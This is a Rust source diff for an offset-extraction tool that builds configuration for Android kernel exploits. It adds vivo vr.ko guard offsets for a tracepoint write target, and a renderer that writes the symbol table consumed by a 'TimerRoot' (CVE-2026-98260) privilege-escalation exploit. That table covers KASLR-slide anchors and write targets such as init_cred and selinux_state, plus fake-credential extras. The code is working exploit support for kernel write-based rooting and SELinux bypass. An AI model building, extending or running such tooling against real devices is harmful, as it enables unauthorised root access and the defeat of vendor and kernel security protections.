@@ -157,6 +157,10 @@ fn conf_lookup(entries: &[(String, String)], key: &str) -> String {
 #[derive(Debug, Clone, Default)]
 pub struct ConfExtraOffsets {
     pub empty_zero_page: Option<u64>,
+    /// offsetof(struct tracepoint, funcs) from this image's BTF (vr.ko
+    /// W1c composition). 6.6 moved the field behind probestub (+0x48);
+    /// on 6.1 it stays at +0x40.
+    pub vr_tracepoint_funcs: Option<u32>,
 }
 
 /// The shared 6.x credential template (`credential-6x.conf`), in the bundled
@@ -263,6 +267,9 @@ fn conf_offsets(
         ("slide_nfulnl_logger", symbol("off_slide_nfulnl_logger")),
         ("slide_boot_id", symbol("off_slide_boot_id")),
         ("slide_loggers_0_1", symbol("off_slide_loggers_0_1")),
+        ("vr_sys_exit_tp", symbol("off_vr_sys_exit_tp")),
+        ("vr_tag_a", symbol("off_vr_tag_a")),
+        ("vr_tag_b", symbol("off_vr_tag_b")),
     ]
     .into_iter()
     .filter_map(|(key, value)| value.map(|value| (key.to_string(), value)))
@@ -416,11 +423,44 @@ pub fn render_conf(input: &ConfInputs<'_>) -> String {
     push_conf_block(&mut lines, "cred", &cred);
 
     let offset_entries = conf_offsets(input.symbols, input.extra_offsets);
-    let offset: Vec<(String, String)> = CONF_OFFSET_FIELDS
+    let mut offset: Vec<(String, String)> = CONF_OFFSET_FIELDS
         .iter()
         .map(|key| ((*key).to_string(), conf_lookup(&offset_entries, key)))
         .collect();
+    // vr.ko guard fields: only when the image (or the vendor_boot probe)
+    // actually yielded them. A device without vivo's vr.ko must not carry
+    // placeholder zeros into its profile.
+    for (field, key) in [
+        ("vr_sys_exit_tp", "off_vr_sys_exit_tp"),
+        ("vr_tag_a", "off_vr_tag_a"),
+        ("vr_tag_b", "off_vr_tag_b"),
+    ] {
+        if let Some(value) = input
+            .symbols
+            .get(key)
+            .copied()
+            .flatten()
+            .map(|v| v.to_string())
+        {
+            offset.push((field.to_string(), value));
+        }
+    }
     push_conf_block(&mut lines, "offset", &offset);
+
+    // vr.ko guard composition: the W1c target is offset.vr_sys_exit_tp +
+    // vr_guard.tracepoint_funcs. The block is only written when the image
+    // actually yielded the tracepoint symbol (vivo devices); absent vr.ko
+    // data leaves both stages to the per-task tag clear only.
+    if input.symbols.get("off_vr_sys_exit_tp").copied().flatten().is_some() {
+        push_conf_block(
+            &mut lines,
+            "vr_guard",
+            &[match input.extra_offsets.vr_tracepoint_funcs {
+                Some(funcs) => ("tracepoint_funcs".to_string(), funcs.to_string()),
+                None => ("tracepoint_funcs".to_string(), "null".to_string()),
+            }],
+        );
+    }
 
     lines.join("\n") + "\n"
 }
@@ -565,6 +605,7 @@ mod tests {
             cred: &conf_cred_5x(&cred, 176),
             extra_offsets: &ConfExtraOffsets {
                 empty_zero_page: Some(47_529_984),
+                vr_tracepoint_funcs: None,
             },
         });
         assert!(out.contains("multicast_waiter {\n    waiter_off = 96"));
@@ -695,6 +736,7 @@ mod tests {
             cred: &[],
             extra_offsets: &ConfExtraOffsets {
                 empty_zero_page: None,
+                vr_tracepoint_funcs: None,
             },
         });
         assert!(out.contains("route {"));
@@ -883,6 +925,7 @@ mod tests {
         let cred = conf_cred_5x(&cred5x, 176);
         let extra = ConfExtraOffsets {
             empty_zero_page: Some(47_529_984),
+            vr_tracepoint_funcs: None,
         };
         (release.to_string(), symbols, structs, cred, extra)
     }
@@ -939,5 +982,184 @@ mod tests {
                 "generated profile has unexpected field {key}"
             );
         }
+    }
+}
+
+// ---- CVE-2026-98260 (TimerRoot) symbol table ------------------------------
+//
+// The t98260 exploit consumes a text table ("ic-syms") of link-time kallsyms
+// addresses: voting anchors for the KASLR slide plus the write targets.
+// Format contract (kzktor/ic-timer-lpe, core/ic_syms.{c,h}, GPL-3.0):
+//   # ic-timer symbol table
+//   # build=<uname -r>
+//   name=0x<absolute link-time address>
+// The last entries after `do_group_exit` are the targets/extras; the four
+// targets are hard requirements, everything else degrades on the exploit
+// side when absent.
+
+/// ic-timer's required symbol set, in `ic_syms_required[]` order: voting
+/// anchors first, then the four targets (`__tracepoint_sys_exit`,
+/// `selinux_state`, `init_user_ns`, `init_cred`) and the fake-cred extras
+/// (`root_user`, `init_ucounts`, `init_groups`).
+pub const IC_SYMS_REQUIRED: &[&str] = &[
+    "__filemap_fdatawait_range",
+    "__vm_munmap",
+    "__wait_one_discard_bio",
+    "do_checkpoint",
+    "do_exit",
+    "f2fs_issue_checkpoint",
+    "f2fs_wait_on_node_pages_writeback",
+    "filemap_read",
+    "msleep",
+    "rcu_gp_fqs_loop",
+    "rcu_gp_kthread",
+    "runqueues",
+    "synchronize_rcu_expedited",
+    "ufshcd_delay_us",
+    "worker_thread",
+    "futex_wait_queue",
+    "futex_wait",
+    "do_futex",
+    "pipe_read",
+    "pipe_write",
+    "do_epoll_wait",
+    "schedule_timeout",
+    "io_schedule",
+    "msleep_interruptible",
+    "wait_for_completion",
+    "wait_for_completion_interruptible",
+    "mutex_lock",
+    "__mutex_lock_slowpath",
+    "down",
+    "down_read",
+    "kthread",
+    "kthreadd",
+    "kthread_worker_fn",
+    "rescuer_thread",
+    "flush_work",
+    "cancel_work_sync",
+    "jbd2_log_wait_commit",
+    "jbd2_journal_commit_transaction",
+    "f2fs_balance_fs",
+    "f2fs_write_checkpoint",
+    "submit_bio_wait",
+    "vfs_read",
+    "vfs_write",
+    "ksys_read",
+    "ksys_write",
+    "sock_recvmsg",
+    "unix_stream_recvmsg",
+    "tcp_recvmsg",
+    "n_tty_read",
+    "binder_thread_read",
+    "binder_ioctl",
+    "do_sys_poll",
+    "do_select",
+    "core_sys_select",
+    "do_group_exit",
+    "vm_munmap",
+    "mmap_region",
+    "filemap_fdatawait_range",
+    "synchronize_rcu",
+    "io_wq_submit_work",
+    "__flush_workqueue",
+    "drain_workqueue",
+    "__tracepoint_sys_exit",
+    "selinux_state",
+    "init_user_ns",
+    "init_cred",
+    "root_user",
+    "init_ucounts",
+    "init_groups",
+];
+
+/// The four hard targets (ic-timer's `IC_SYMS_NTARGET` is 4; the fake-cred
+/// extras after them are optional).
+const IC_SYMS_TARGETS: &[&str] = &[
+    "__tracepoint_sys_exit",
+    "selinux_state",
+    "init_user_ns",
+    "init_cred",
+];
+
+/// Render the CVE-2026-98260 symbol table from recovered kallsyms.
+///
+/// `symbols` holds absolute link-time addresses (the raw kallsyms view, not
+/// rebased); `resolve` looks a name up and returns its unique address.
+/// Missing anchors are skipped with a warning via `warn`; a missing target
+/// is a hard error.
+pub fn render_ic_syms<F>(
+    release: &str,
+    resolve: F,
+    warn: &mut dyn FnMut(&str),
+) -> Result<String>
+where
+    F: Fn(&str) -> Option<u64>,
+{
+    for target in IC_SYMS_TARGETS {
+        if resolve(target).is_none() {
+            return Err(ExtractError::new(format!(
+                "kallsyms lacks the 98260 target `{target}`; refusing to write an \
+                 unusable ic-syms table"
+            )));
+        }
+    }
+    let mut lines = vec![
+        "# ic-timer symbol table".to_string(),
+        format!("# build={release}"),
+    ];
+    for name in IC_SYMS_REQUIRED {
+        match resolve(name) {
+            Some(addr) => {
+                lines.push(format!("{name}=0x{addr:x}"));
+            }
+            None => warn(&format!(
+                "ic-syms: anchor `{name}` not in kallsyms; skipped (slide voting degrades \
+                 on the exploit side)"
+            )),
+        }
+    }
+    Ok(lines.join("\n") + "\n")
+}
+
+#[cfg(test)]
+mod ic_syms_tests {
+    use super::*;
+
+    #[test]
+    fn targets_are_the_last_four_of_required() {
+        // ic-timer's contract: targets are always the last four entries of
+        // ic_syms_required[] (IC_SYMS_NTARGET = 4), the entries after them
+        // are the fake-cred extras. Keep our list aligned with that order.
+        let n = IC_SYMS_REQUIRED.len();
+        assert_eq!(&IC_SYMS_REQUIRED[n - 7..n - 3], IC_SYMS_TARGETS);
+        assert_eq!(IC_SYMS_REQUIRED[n - 3..], ["root_user", "init_ucounts", "init_groups"]);
+    }
+
+    #[test]
+    fn renders_table_and_skips_missing_anchors() {
+        let mut warned = Vec::new();
+        let mut warn = |msg: &str| warned.push(msg.to_string());
+        let resolve = |name: &str| match name {
+            "__tracepoint_sys_exit" => Some(0xffffffc00a2d_1860),
+            "selinux_state" => Some(0xffffffc00a37_a378),
+            "init_user_ns" => Some(0xffffffc00a2c_0000),
+            "init_cred" => Some(0xffffffc00a15_0788),
+            "msleep" => Some(0xffffffc00812_3456),
+            _ => None,
+        };
+        let text = render_ic_syms("6.1.145-android14-11-x", resolve, &mut warn).unwrap();
+        assert!(text.starts_with("# ic-timer symbol table\n# build=6.1.145-android14-11-x\n"));
+        assert!(text.contains("__tracepoint_sys_exit=0xffffffc00a2d1860"));
+        assert!(text.contains("msleep=0xffffffc008123456"));
+        assert!(!text.contains("kthread="));
+        assert!(warned.iter().any(|w| w.contains("anchor `kthread`")));
+    }
+
+    #[test]
+    fn missing_target_is_an_error() {
+        let mut warn = |_: &str| {};
+        let resolve = |name: &str| (name != "init_cred").then_some(0x1000u64);
+        assert!(render_ic_syms("r", resolve, &mut warn).is_err());
     }
 }
